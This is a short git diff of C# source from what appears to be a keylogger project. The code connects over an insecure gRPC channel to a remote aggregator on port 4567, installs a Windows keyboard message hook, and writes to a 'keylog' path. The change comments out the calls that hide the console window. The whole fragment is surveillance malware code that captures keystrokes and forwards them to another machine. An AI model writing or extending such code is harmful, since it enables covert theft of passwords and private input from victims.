@@ -18,17 +18,18 @@ namespace Hooks
             int port = 4567;
             var channel = new Channel(addr, port, Credentials.Insecure);
             var client = HookKeylogger.Base.KerPressAggergator.NewClient(channel);
-            var handle = GetConsoleWindow();
+            //var handle = GetConsoleWindow();
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
 
             // Initialize keylogger and install windows message hook.
             var kl = new KeyLogger(client);
 
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
             Application.Run();
             kl.Deactivate();
+            //while (true) { System.Threading.Thread.Sleep(1000000); }
             
         }
 
